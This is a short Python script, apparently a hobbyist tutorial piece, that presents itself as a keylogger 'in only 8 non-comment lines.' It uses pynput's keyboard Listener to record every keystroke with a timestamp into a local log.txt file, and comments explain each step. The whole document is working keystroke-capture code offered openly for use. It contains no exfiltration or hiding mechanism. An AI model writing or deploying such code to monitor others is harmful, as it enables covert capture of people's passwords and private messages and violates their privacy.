#Python Keylogger in only 8 non-comment lines!
#Keylogger framework is adapted from Joshua Fluke
#pynput is from Python
#Created and modified by Cade
#Import key and listener classes from pynput
from pynput.keyboard import Key, Listener 
#import logging module from python
import logging;
#Create our log file by getting current directory and adding log.txt to the file path
log_dir = ""
#Still creating the file but here we are setting up the format for the file by including current time of keystroke and key
logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s: ')
#Here we will define our function that will log keystrokes to the file
def on_press(key):
    logging.info(str(key))
#This is the only part will we use pynput
#Collect key input until key is released, this will allow use to monitor multiple keys being pressed at the same time such as alt and tab
with Listener(on_press=on_press) as listener:
    listener.join()
